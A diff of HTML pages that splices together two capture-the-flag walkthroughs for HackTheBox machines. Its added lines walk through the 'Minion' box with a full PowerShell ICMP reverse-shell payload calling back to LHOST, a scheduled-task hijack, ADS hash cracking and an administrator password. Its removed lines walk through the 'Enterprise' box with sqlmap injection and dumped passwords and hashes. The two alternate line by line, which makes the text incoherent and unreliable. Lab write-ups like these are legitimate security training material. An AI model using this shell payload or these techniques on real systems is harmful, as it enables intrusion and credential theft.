class="p">.</span><span class="n">Exception</span><span class="p">|</span><span class="nb">out-string</span><span class="p">)</span> <span class="p">};</span> <span class="nv">$i</span><span class="p">=</span><span class="n">0</span><span class="p">;</span> <span class="k">while</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">-lt</span> <span class="nv">$rt</span><span class="p">.</span><span class="n">length</span><span class="p">-</span><span class="n">110</span><span class="p">)</span> <span class="p">{</span> <span class="n">s</span><span class="p">(</span><span class="n">-join</span><span class="p">(</span><span class="nv">$id</span><span class="p">,</span><span class="nv">$rt</span><span class="p">.</span><span class="n">Substring</span><span class="p">(</span><span class="nv">$i</span><span class="p">,</span><span class="n">110</span><span class="p">)));</span> <span class="nv">$i</span> <span class="p">-=</span> <span class="p">-</span><span class="n">110</span><span class="p">;</span> <span class="p">};</span> <span class="n">s</span><span class="p">(</span><span class="n">-join</span><span class="p">(</span><span class="nv">$id</span><span class="p">,</span><span class="nv">$rt</span><span class="p">.</span><span class="n">Substring</span><span class="p">(</span><span class="nv">$i</span><span class="p">)));</span> <span class="p">}</span></code></pre></div></p>
 
------------------
+<p>You can see I did some tricks like using $i -= -110 instead of $i += 110 etc. My script has a feature of unique ids, because -when using the ICMP protocol- things can get quite messy if multiple payloads are running simultaneously. You can download my script from here: <a href="https://github.com/Alamot/code-snippets/blob/master/hacking/HTB/Minion/icmp_alamot.py" target="_blank">https://github.com/Alamot/code-snippets/blob/master/hacking/HTB/Minion/icmp_alamot.py</a></p>
 
-GENERATED WORDS: 4612                                                          
+<p>Now, let&rsquo;s get a shell (don&rsquo;t forget to change LHOST inside the script):
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo python2 icmp_alamot.py
 
----- Scanning URL: https://10.10.10.61/ ----
-==&gt; DIRECTORY: https://10.10.10.61/files/                                                                          
-+ https://10.10.10.61/index.html (CODE:200|SIZE:10918)                                                             
-+ https://10.10.10.61/server-status (CODE:403|SIZE:300)                                                            
+Sending powershell ICMP payload [UID=35cfb54c] and waiting for shell...
+[P$] apppool\defaultapppool@MINION inetsrv&gt; ls C:\   
 
----- Entering directory: https://10.10.10.61/files/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
-    (Use mode &#39;-w&#39; if you want to scan it anyway)</code></pre></div></div>
-    
+    Directory: C:\
 
-<h3 id="port-8080">Port 8080</h3>
+Mode                LastWriteTime     Length Name                              
+----                -------------     ------ ----                              
+d----          9/4/2017   7:42 PM            accesslogs                        
+d----         8/10/2017  10:43 AM            inetpub                           
+d----         3/28/2018   6:31 AM            Microsoft                         
+d----         8/22/2013   8:52 AM            PerfLogs                          
+d-r--         9/25/2017   1:51 AM            Program Files                     
+d----         8/10/2017   9:42 AM            Program Files (x86)               
+d----         8/24/2017   1:28 AM            sysadmscripts                     
+d----         3/28/2018   8:51 AM            temp                              
+d-r--          9/4/2017   7:41 PM            Users                             
+d----         9/10/2017  10:20 AM            Windows</code></pre></div></div></p>
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ dirb http://10.10.10.61:8080/
+<h1 id="getting-decoder">Getting decoder</h1>
 
------------------
-DIRB v2.22    
-By The Dark Raver
------------------
+<p>The folder sysadmscripts seems interesting:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">[P$] apppool\defaultapppool@MINION inetsrv&gt; ls C:\sysadmscripts
 
-START_TIME: Thu Mar 15 16:19:44 2018
-URL_BASE: http://10.10.10.61:8080/
-WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+    Directory: C:\sysadmscripts
 
------------------
+Mode                LastWriteTime     Length Name                              
+----                -------------     ------ ----                              
+-a---         3/28/2018   8:47 AM        176 c.ps1                             
+-a---         8/22/2017  10:46 AM        263 del_logs.bat                      </code></pre></div></div></p>
 
-GENERATED WORDS: 4612                                                          
+<p>Let&rsquo;s see the contents of del_logs.bat:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">[P$] apppool\defaultapppool@MINION inetsrv&gt; cat C:\sysadmscripts\del_logs.bat
 
----- Scanning URL: http://10.10.10.61:8080/ ----
-+ http://10.10.10.61:8080/0 (CODE:200|SIZE:7678)                                                                   
-+ http://10.10.10.61:8080/01 (CODE:200|SIZE:8286)                                                                  
-+ http://10.10.10.61:8080/02 (CODE:200|SIZE:8595)                                                                  
-+ http://10.10.10.61:8080/1 (CODE:200|SIZE:8285)                                                                   
-+ http://10.10.10.61:8080/1x1 (CODE:200|SIZE:8287)                                                                 
-+ http://10.10.10.61:8080/2 (CODE:200|SIZE:8594)                                                                   
-+ http://10.10.10.61:8080/2g (CODE:200|SIZE:8595)                                                                  
-+ http://10.10.10.61:8080/about (CODE:200|SIZE:8160)                                                               
-+ http://10.10.10.61:8080/About (CODE:200|SIZE:8160)</code></pre></div></div>
-                                                             
+@echo off
+echo %DATE% %TIME% start job &gt;&gt; c:\windows\temp\log.txt
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden -exec bypass -nop -file c:\sysadmscripts\c.ps1 c:\accesslogs 
+echo %DATE% %TIME% stop job &gt;&gt; c:\windows\temp\log.txt</code></pre></div></div></p>
 
-<p>If we visit <a href="https://10.10.10.61/files/" target="_blank">https://10.10.10.61/files/</a> we discover an archive lcars.zip which contains 3 files:
-<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">501 Oct 17 04:25 lcars_db.php
-624 Oct 17 04:32 lcars_dbpost.php
-377 Oct 17 07:53 lcars.php</code></pre></div></p>
+<p>We can&rsquo;t read this c:\windows\temp\log.txt but if we do a dir in different times we can see that its LastWriteTime changes every 5 minutes.
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">[P$] apppool\defaultapppool@MINION inetsrv&gt; dir c:\windows\temp\log.txt
 
-<p>If we look inside lcars.php we see some info:
-<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">...
-Plugin Name: lcars
-...</code></pre></div></p>
 
-<p>So, maybe there is installed a wordpress plugin named lcars&hellip; Interesting. Let&rsquo;s have a look inside lcars_db.php:
-<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
-<span class="k">include</span> <span class="s2">&#34;/var/www/html/wp-config.php&#34;</span><span class="p">;</span>
-<span class="nv">$db</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">mysqli</span><span class="p">(</span><span class="nx">DB_HOST</span><span class="p">,</span> <span class="nx">DB_USER</span><span class="p">,</span> <span class="nx">DB_PASSWORD</span><span class="p">,</span> <span class="nx">DB_NAME</span><span class="p">);</span>
-<span class="c1">// Test the connection:
-</span><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="nx">mysqli_connect_errno</span><span class="p">()){</span>
-    <span class="c1">// Connection Error
-</span><span class="c1"></span>    <span class="k">exit</span><span class="p">(</span><span class="s2">&#34;Couldn&#39;t connect to the database: &#34;</span><span class="o">.</span><span class="nx">mysqli_connect_error</span><span class="p">());</span>
-<span class="p">}</span>
+    Directory: C:\windows\temp
 
-<span class="c1">// test to retireve an ID
-</span><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;query&#39;</span><span class="p">])){</span>
-    <span class="nv">$query</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;query&#39;</span><span class="p">];</span>
-    <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;SELECT ID FROM wp_posts WHERE post_name = </span><span class="si">$query</span><span class="s2">&#34;</span><span class="p">;</span>
-    <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
-    <span class="k">echo</span> <span class="nv">$result</span><span class="p">;</span>
-<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-    <span class="k">echo</span> <span class="s2">&#34;Failed to read query&#34;</span><span class="p">;</span>
-<span class="p">}</span>
-<span class="cp">?&gt;</span>
-</code></pre></div></p>
 
-<p>Nice. I think this code begs for an SQL injection&hellip;</p>
+Mode                LastWriteTime     Length Name                              
+----                -------------     ------ ----                              
+-a---         4/10/2018  12:01 PM     197511 log.txt</code></pre></div></div></p>
 
-<h1 id="sql-injection">SQL Injection</h1>
+<p>Let&rsquo;s examine the permissions in the sysadmscripts folder:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">[P$] apppool\defaultapppool@MINION sysadmscripts&gt; ls | get-acl | fl
 
-<p>Let&rsquo;s use sqlmap to exploit this SQLI:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sqlmap -u &#34;http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=22&#34; --dbms=mysql
+Path   : Microsoft.PowerShell.Core\FileSystem::C:\sysadmscripts\c.ps1
+Owner  : BUILTIN\Administrators
+Group  : MINION\None
+Access : Everyone Allow  FullControl
+         NT AUTHORITY\SYSTEM Allow  FullControl
+         BUILTIN\Administrators Allow  FullControl
+         BUILTIN\Users Allow  FullControl
+Audit  : 
+Sddl   : O:BAG:S-1-5-21-2506507270-770315343-2455145413-513D:PAI(A;;FA;;;WD)(A;
+         ;FA;;;SY)(A;;FA;;;BA)(A;;FA;;;BU)
 
-sqlmap identified the following injection point(s) with a total of 40 HTTP(s) requests:
----
-Parameter: query (GET)
-    Type: boolean-based blind
-    Title: MySQL &gt;= 5.0 boolean-based blind - Parameter replace
-    Payload: query=(SELECT (CASE WHEN (3344=3344) THEN 3344 ELSE 3344*(SELECT 3344 FROM INFORMATION_SCHEMA.PLUGINS) END))
+Path   : Microsoft.PowerShell.Core\FileSystem::C:\sysadmscripts\del_logs.bat
+Owner  : BUILTIN\Administrators
+Group  : MINION\None
+Access : Everyone Allow  ReadAndExecute, Synchronize
+         NT AUTHORITY\SYSTEM Allow  FullControl
+         BUILTIN\Administrators Allow  FullControl
+         BUILTIN\Users Allow  ReadAndExecute, Synchronize
+Audit  : 
+Sddl   : O:BAG:S-1-5-21-2506507270-770315343-2455145413-513D:PAI(A;;0x1200a9;;;
+         WD)(A;;FA;;;SY)(A;;FA;;;BA)(A;;0x1200a9;;;BU)</code></pre></div></div></p>
 
-    Type: error-based
-    Title: MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)
-    Payload: query=(SELECT 3017 FROM(SELECT COUNT(*),CONCAT(0x716b6a7871,(SELECT (ELT(3017=3017,1))),0x716b717871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
----</code></pre></div></div></p>
+<p>User decoder runs the script c.ps1 every 5 minutes and we can overwrite it with our own payload. The problem is that in a multi-user, multi-hacker environment everyone else can (and want to) do the same. So, we have to be very patient and very lucky to succeed. Moreover, sometimes the MINION box is quite laggy even after a fresh reset. I don&rsquo;t know why this happens. So, let&rsquo;s be patient and hope our c.ps1 payload will not be overwritten till it is executed.</p>
 
-<p>Let&rsquo;s see what databases we have:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sqlmap -u &#34;http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=22&#34; --dbms=mysql --dbs
+<p>Inside icmp_alamot.py, I have coded some extra features:
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text"># &gt; UPLOAD local_path remote_path
+#   (to upload a file using the HTTP protocol via xcmd, &#34;echo &gt;&gt;&#34; commands and
+#    base64 encoding/decoding)
+#   e.g. &gt; UPLOAD myfile.txt C:\temp\myfile.txt
+#
+# &gt; DOWNLOAD remote_path
+#   (to download a file using the ICMP protocol and base64 encoding/decoding)
+#    e.g. &gt; DOWNLOAD C:\temp\myfile.txt
+#
+# &gt; DECODER (to get user decoder)
+#
+# &gt; ADMIN (to get user admin)</code></pre></div></p>
 
-web server operating system: Linux Debian 8.0 (jessie)
-web application technology: PHP 5.6.31, Apache 2.4.10
-back-end DBMS: MySQL &gt;= 5.0.0
-available databases [8]:
-[*] information_schema
-[*] joomla
-[*] joomladb
-[*] mysql
-[*] performance_schema
-[*] sys
-[*] wordpress
-[*] wordpressdb</code></pre></div></div></p>
+<p>If you are curious have a look in the code. The command DECODER I have coded uses HTTP to upload our payload in c:\sysadmscripts\c.ps1:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">[P$] iis apppool\defaultapppool@MINION inetsrv&gt; DECODER
+Uploading c.ps1 to c:\sysadmscripts\c.ps1
+MD5 hash: 9e860b7e4773f394c7aa9be5b88b7cfc
+Data Length: 976 bytes
+100%|█████████████████████████████████████████████████████████████████████████| 990/990 [00:01&lt;00:00, 795.59bytes/s]
+Waiting for decoder shell...
+[P$] minion\decoder@MINION system32&gt; whoami
+minion\decoder</code></pre></div></div></p>
 
-<h2 id="dumping-the-wordpress-database">Dumping the wordpress database</h2>
+<h1 id="getting-admin">Getting admin</h1>
 
-<p>Let&rsquo;s dump the wordpress database:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sqlmap -u &#34;http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=22&#34; --dbms=mysql -D wordpress --dump
+<p>There is a backup.zip in the folder C:\users\decoder.MINION\Desktop:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">[P$] minion\decoder@MINION system32&gt; cd C:\users\decoder.MINION\Desktop
+[P$] minion\decoder@MINION Desktop&gt; ls
 
+
+    Directory: C:\users\decoder.MINION\Desktop
+
+
+Mode                LastWriteTime     Length Name                              
+----                -------------     ------ ----                              
+-a---          9/4/2017   7:19 PM     103297 backup.zip                        
+-a---         8/25/2017  11:09 AM         33 user.txt</code></pre></div></div></p>
+
+<p>We can unzip the backup.zip using powershell commands:
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">Add-Type</span> <span class="n">-AssemblyName</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">Compression</span><span class="p">.</span><span class="n">FileSystem</span><span class="p">;</span> <span class="k">function</span> <span class="n">Unzip</span> <span class="p">{</span> <span class="k">param</span><span class="p">(</span><span class="no">[string]</span><span class="nv">$zipfile</span><span class="p">,</span> <span class="no">[string]</span><span class="nv">$outpath</span><span class="p">);</span> <span class="no">[System.IO.Compression.ZipFile]</span><span class="p">::</span><span class="n">ExtractToDirectory</span><span class="p">(</span><span class="nv">$zipfile</span><span class="p">,</span> <span class="nv">$outpath</span><span class="p">);</span> <span class="p">};</span> <span class="n">Unzip</span> <span class="s2">&#34;C:\Users\decoder.MINION\Desktop\backup.zip&#34;</span> <span class="s2">&#34;C:\temp\unzip&#34;</span></code></pre></div></p>
+
+<p>But we are not gonna find anything useful inside this zip archive. But do you know/remember ADS (Alternate Data Streams)? Let&rsquo;s have a look:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">[P$] minion\decoder@MINION Desktop&gt; cmd /C dir /Q /R
+ Volume in drive C has no label.
+ Volume Serial Number is 143B-1804
+
+ Directory of C:\users\decoder.MINION\Desktop
+
+09/22/20017  04:43 PM    &lt;DIR&gt;          MINION\decoder         .
+09/22/2017  04:43 PM    &lt;DIR&gt;          NT AUTHORITY\SYSTEM    ..
+09/044/2017  07:19 PM           103,297 BUILTIN\Administrators backup.zip
+                                    34                         backup.zip:pass:$DATA
+08/25/2017  11:09 AM                33 BUILTIN\Administrators user.txt</code></pre></div></div></p>
+
+<p>I like the old cmd command dir /Q /R because it is brief and it shows very concisely the owners (/Q) and the ADS (/R). But If you want, you can see the ADS using Powershell too:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">[P$] minion\decoder@MINION Desktop&gt; Get-Item -Path c:\users\decoder.MINION\Desktop\backup.zip -stream *
+
+   FileName: C:\users\decoder.MINION\Desktop\backup.zip
+
+Stream                   Length
+------                   ------
+
+:$DATA                   103297
+pass                         34</code></pre></div></div></p>
+
+<p>Let&rsquo;s read this ADS:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">[P$] minion\decoder@MINION Desktop&gt; type c:\users\decoder.MINION\Desktop\backup.zip:pass
+28a5d1e0c15af9f8fce7db65d75bbf17</code></pre></div></div></p>
+
+<p>We found a hash. Let&rsquo;s discover its type:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ hashid 28a5d1e0c15af9f8fce7db65d75bbf17
+Analyzing &#39;28a5d1e0c15af9f8fce7db65d75bbf17&#39;
+[+] MD2 
+[+] MD5 
+[+] MD4 
+[+] Double MD5 
+[+] LM 
+[+] RIPEMD-128 
+[+] Haval-128 
+[+] Tiger-128 
+[+] Skein-256(128) 
+[+] Skein-512(128) 
+[+] Lotus Notes/Domino 5 
+[+] Skype 
+[+] Snefru-128 
+[+] NTLM 
+[+] Domain Cached Credentials 
+[+] Domain Cached Credentials 2 
+[+] DNSSEC(NSEC3) 
+[+] RAdmin v2.x</code></pre></div></div></p>
+
+<p>We are in a Windows environment, so it&rsquo;s probably NTLM. Let&rsquo;s reverse this hash:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ hashcat -h | grep NTLM
+   ... 
+   1000 | NTLM                                             | Operating Systems
+
+$ hashcat -a0 -m 1000 28a5d1e0c15af9f8fce7db65d75bbf17 /usr/share/dict/rockyou.txt 
 ...
-wp_posts
---------
-ID,guid,pinged,to_ping,post_date,post_type,post_name,menu_order,post_title,post_status,post_parent,ping_status,post_author,post_content,post_excerpt,post_date_gmt,post_modified,comment_count,post_password,post_mime_type,comment_status,post_modified_gmt,post_content_filtered
-6,http://10.10.10.61/?p=66,&lt;blank&gt;,&lt;blank&gt;,2017-09-06 15:40:30,post,&lt;blank&gt;,0,Passwords,draft,0,open,1,Needed somewhere to put some passwords quickly\r\n\r\nZxJyhGem4k338S2Y\r\n\r\nenterprisencc170\r\n\r\nZD3YxfnSjezg67JZ\r\n\r\nu*Z14ru0p#ttj83zS6\r\n\r\n \r\n\r\n ,&lt;blank&gt;,0000-00-00 00:00:00,2017-09-06 15:40:30,0,&lt;blank&gt;,&lt;blank&gt;,open,2017-09-06 14:40:30,&lt;blank&gt;
-67,http://10.10.10.61/?p=67,&lt;blank&gt;,&lt;blank&gt;,2017-09-06 
+28a5d1e0c15af9f8fce7db65d75bbf17:1234test
 ...</code></pre></div></div></p>
 
-<p>Nice, we have found some passwords: Passwords: ZxJyhGem4k338S2Y, enterprisencc170, ZD3YxfnSjezg67JZ, u*Z14ru0p#ttj83zS6. But we lack a username. Let&rsquo;s use wpscan to enumerate users:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ wpscan --url http://10.10.10.61/wp-content -e u
+<p>If we try it, we are gonna find that this is the administrator password. We can execute commands as administrator like this:
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nv">$user</span> <span class="p">=</span> <span class="s1">&#39;.\administrator&#39;</span><span class="p">;</span> <span class="nv">$passwd</span> <span class="p">=</span> <span class="s1">&#39;1234test&#39;</span><span class="p">;</span> <span class="nv">$secpswd</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="nv">$passwd</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">;</span> <span class="nv">$credential</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span> <span class="nv">$user</span><span class="p">,</span> <span class="nv">$secpswd</span><span class="p">;</span> <span class="nb">invoke-command</span> <span class="n">-computername</span> <span class="n">localhost</span> <span class="n">-credential</span> <span class="nv">$credential</span> <span class="n">-scriptblock</span> <span class="p">{</span> <span class="n">COMMANDS</span> <span class="p">}</span></code></pre></div></p>
 
+<p>The way I used to get an admin shell is by replicating my ICMP powershell payload inside the scriptblock:
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nv">$user</span> <span class="p">=</span> <span class="s1">&#39;.\administrator&#39;</span><span class="p">;</span> <span class="nv">$passwd</span> <span class="p">=</span> <span class="s1">&#39;1234test&#39;</span><span class="p">;</span> <span class="nv">$secpswd</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="nv">$passwd</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">;</span> <span class="nv">$credential</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span> <span class="nv">$user</span><span class="p">,</span> <span class="nv">$secpswd</span><span class="p">;</span> <span class="nb">invoke-command</span> <span class="n">-computername</span> <span class="n">localhost</span> <span class="n">-credential</span> <span class="nv">$credential</span> <span class="n">-scriptblock</span> <span class="p">{</span> <span class="nv">$ip</span> <span class="p">=</span> <span class="s1">&#39;LHOST&#39;</span><span class="p">;</span> <span class="nv">$id</span> <span class="p">=</span> <span class="s1">&#39;UNIQUEID&#39;</span><span class="p">;</span> <span class="nv">$ic</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">NetworkInformation</span><span class="p">.</span><span class="n">Ping</span><span class="p">;</span> <span class="nv">$po</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">NetworkInformation</span><span class="p">.</span><span class="n">PingOptions</span><span class="p">;</span> <span class="nv">$po</span><span class="p">.</span><span class="n">DontFragment</span><span class="p">=</span><span class="nv">$true</span><span class="p">;</span> <span class="k">function</span> <span class="n">s</span><span class="p">(</span><span class="nv">$b</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$ic</span><span class="p">.</span><span class="n">Send</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span><span class="n">5000</span><span class="p">,(</span><span class="no">[text.encoding]</span><span class="p">::</span><span class="n">ASCII</span><span class="p">).</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$b</span><span class="p">),</span><span class="nv">$po</span><span class="p">)</span> <span class="p">};</span> <span class="k">function</span> <span class="n">p</span> <span class="p">{</span> <span class="n">-join</span><span class="p">(</span><span class="nv">$id</span><span class="p">,</span><span class="s1">&#39;[P$] &#39;</span><span class="p">,$(</span><span class="n">whoami</span><span class="p">),</span><span class="s1">&#39;@&#39;</span><span class="p">,</span><span class="nv">$env:computername</span><span class="p">,</span><span class="s1">&#39; &#39;</span><span class="p">,$((</span><span class="n">gi</span> <span class="nv">$pwd</span><span class="p">).</span><span class="n">Name</span><span class="p">),</span><span class="s1">&#39;&gt; &#39;</span><span class="p">)</span> <span class="p">};</span> <span class="k">while</span> <span class="p">(</span><span class="nv">$true</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$r</span> <span class="p">=</span> <span class="n">s</span><span class="p">(</span><span class="n">p</span><span class="p">);</span> <span class="k">if</span> <span class="p">(!</span><span class="nv">$r</span><span class="p">.</span><span class="n">Buffer</span><span class="p">)</span> <span class="p">{</span> <span class="k">continue</span><span class="p">;</span> <span class="p">};</span> <span class="nv">$rs</span> <span class="p">=</span> <span class="p">(</span><span class="no">[text.encoding]</span><span class="p">::</span><span class="n">ASCII</span><span class="p">).</span><span class="n">GetString</span><span class="p">(</span><span class="nv">$r</span><span class="p">.</span><span class="n">Buffer</span><span class="p">);</span>  <span class="k">if</span> <span class="p">(</span><span class="nv">$rs</span><span class="p">.</span><span class="n">Substring</span><span class="p">(</span><span class="n">0</span><span class="p">,</span><span class="n">8</span><span class="p">)</span> <span class="o">-ne</span> <span class="nv">$id</span><span class="p">)</span> <span class="p">{</span> <span class="n">exit</span> <span class="p">};</span> <span class="k">try</span> <span class="p">{</span> <span class="nv">$rt</span> <span class="p">=</span> <span class="p">(</span><span class="n">iex</span> <span class="n">-Command</span> <span class="nv">$rs</span><span class="p">.</span><span class="n">Substring</span><span class="p">(</span><span class="n">8</span><span class="p">)</span> <span class="p">|</span> <span class="nb">Out-String</span><span class="p">);</span> <span class="p">}</span> <span class="k">catch</span> <span class="p">{</span> <span class="nv">$rt</span> <span class="p">=</span> <span class="p">(</span><span class="nv">$_</span><span class="p">.</span><span class="n">Exception</span><span class="p">|</span><span class="nb">out-string</span><span class="p">)</span> <span class="p">};</span> <span class="nv">$i</span><span class="p">=</span><span class="n">0</span><span class="p">;</span> <span class="k">while</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">-lt</span> <span class="nv">$rt</span><span class="p">.</span><span class="n">length</span><span class="p">-</span><span class="n">110</span><span class="p">)</span> <span class="p">{</span> <span class="n">s</span><span class="p">(</span><span class="n">-join</span><span class="p">(</span><span class="nv">$id</span><span class="p">,</span><span class="nv">$rt</span><span class="p">.</span><span class="n">Substring</span><span class="p">(</span><span class="nv">$i</span><span class="p">,</span><span class="n">110</span><span class="p">)));</span> <span class="nv">$i</span> <span class="p">-=</span> <span class="p">-</span><span class="n">110</span><span class="p">;</span> <span class="p">};</span> <span class="n">s</span><span class="p">(</span><span class="n">-join</span><span class="p">(</span><span class="nv">$id</span><span class="p">,</span><span class="nv">$rt</span><span class="p">.</span><span class="n">Substring</span><span class="p">(</span><span class="nv">$i</span><span class="p">)));</span> <span class="p">}</span> <span class="p">}</span></code></pre></div></p>
+
+<p>Again, I have automated this procedure inside my script. So getting admin is a simple as typing &ldquo;ADMIN&rdquo; :P
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">[P$] minion\decoder@MINION Desktop&gt; ADMIN
+[P$] minion\administrator@MINION Documents&gt; whoami
+minion\administrator
+[P$] minion\administrator@MINION Documents&gt; cd ..\Desktop
+[P$] minion\administrator@MINION Desktop&gt; ls
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                LastWriteTime     Length Name                              
+----                -------------     ------ ----                              
+-a---         9/26/2017   6:18 AM     386479 root.exe                          
+-a---         8/24/2017  12:32 AM         76 root.txt
+
+[P$] minion\administrator@MINION Desktop&gt; cat root.txt
+In order to get the flag you have to launch root.exe located in this folder!</code></pre></div></div></p>
+
+<p>Well, we can get the root flag by executing .\root.exe or C:\Users\Administrator\Desktop\root.exe. If this doesn&rsquo;t print the flag try using cmd (sometimes I had problems to print the flag and the cmd way is what worked for me):
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">[P$] minion\administrator@MINION Desktop&gt; .\root.exe
+25afc18b756db15085428015928a1cf1
+
+[P$] minion\administrator@MINION Desktop&gt; C:\Users\Administrator\Desktop\root.exe
+25afc18b756db15085428015928a1cf1
+
+[P$] minion\administrator@MINION Desktop&gt; cmd /c &#39;root.exe&#39;
+25afc18b756db15085428015928a1cf1</code></pre></div></div></p>
+
+<p>The reason for an executable root.exe instead of a root.txt is to force us to impersonate the Administrator instead of doing, for example, something like this:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">net use I: \\10.10.10.57\C$  /user:administrator &#34;1234test&#34;
+type I:\Users\Administrator\Desktop\root.txt</code></pre></div></div></p>
+
+<p>Now that we are admins, let&rsquo;s explore a little that scheduled task:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">[P$] minion\administrator@MINION Desktop&gt; cat c:\windows\temp\log.txt
+...
+Wed 09/06/2017 17:41:16.01 start job 
+Wed 09/06/2017 17:46:16.01 start job 
+Wed 09/06/2017 17:51:16.03 start job 
 ...
 
-[i] User(s) Identified:
-
-[+] william.riker
- | Detected By: Author Posts - Display Name (Passive Detection)
- | Confirmed By: Login Error Messages (Aggressive Detection)
-
-[+] william-riker
- | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
-
-...</code></pre></div></div></p>
-
-<p>If we do some tests, we will see that the credentials william.riker:u*Z14ru0p#ttj83zS6 are working for <a href="http://10.10.10.61/wp-login.php" target="_blank">http://10.10.10.61/wp-login.php</a></p>
-
-<h2 id="dumping-the-joomladb-database">Dumping the joomladb database</h2>
-
-<p>Now let&rsquo;s dump the joomladb database:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sqlmap -u &#34;http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=22&#34; --dbms=mysql -D joomladb --dump
-
-edz2g_users
------------
-id,name,otep,email,block,otpKey,params,username,password,sendEmail,activation,resetCount,registerDate,requireReset,lastResetTime,lastvisitDate
-400,Super User,&lt;blank&gt;,geordi.la.forge@10.10.10.61,0,&lt;blank&gt;,&#34;{&#34;&#34;admin_style&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;admin_language&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;language&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;editor&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;helpsite&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;timezone&#34;&#34;:&#34;&#34;&#34;&#34;}&#34;,geordi.la.forge,$2y$10$cXSgEkNQGBBUneDKXq9gU.8RAf37GyN7JIrPE7us9UBMR9uDDKaWy,1,0,0,2017-09-03 19:30:04,0,0000-00-00 00:00:00,2017-10-30 13:59:06
